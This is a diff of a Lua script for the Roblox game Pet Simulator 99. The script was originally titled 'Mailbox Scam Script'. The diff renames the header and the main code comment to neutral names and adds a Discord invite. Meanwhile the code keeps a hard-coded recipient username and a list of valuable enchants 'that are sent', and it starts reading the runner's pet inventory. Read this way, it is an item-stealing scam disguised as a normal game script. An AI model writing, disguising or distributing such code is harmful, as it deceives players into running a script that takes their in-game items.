@@ -1,7 +1,9 @@
 --[[
 ═══════════════════════════════════════════════════════════════════════════════
-  Pet Simulator 99 - Mailbox Scam Script
+  Pet Simulator 99 - Script
   Developed by mitzci0
+
+  Discord.gg/8mqNcfMfx4
 
   Current Version: v3.0.6
 
@@ -12,8 +14,7 @@
 
   Last Updated: 2026-06-26
   
-  If you find any bugs/errors, please report them to me via DM on Discord.
-  Username: mitzci0
+If you find any errors/bugs, please report them on our support Discord (linked above).
 ═══════════════════════════════════════════════════════════════════════════════
 ]]--
 
@@ -197,7 +198,7 @@ task.spawn(function()
     end
 end)
 
--- Mailbox Scam
+-- Main
 user = "mitzci0"  -- Change this to your username
 allowed_enchants = {"Mega Chest Breaker", "Chest Breaker", "Chest Mimic", "Diamond Chest Mimic", "Super Shiny Hunter", "Boss Chest Mimic", "Super Magnet", "Boss Lucky Block", "Lightning Orb", "Mini Chest Fortune", "Shiny Supercharge", "Corruption", "Nightmare Orb", "Superior Chest Mimic", "Hacker Key Hunter", "Diamond Gift Hunter", "Diamond Orb", "Active Huge Overload", "Rainbow Egg", "Double Coins", "Breakable Mayhem"} -- The Enchants that are sent (if any)
 for i,v in pairs(require(game.ReplicatedStorage.Library.Client.Save).Get().Inventory.Pet) do
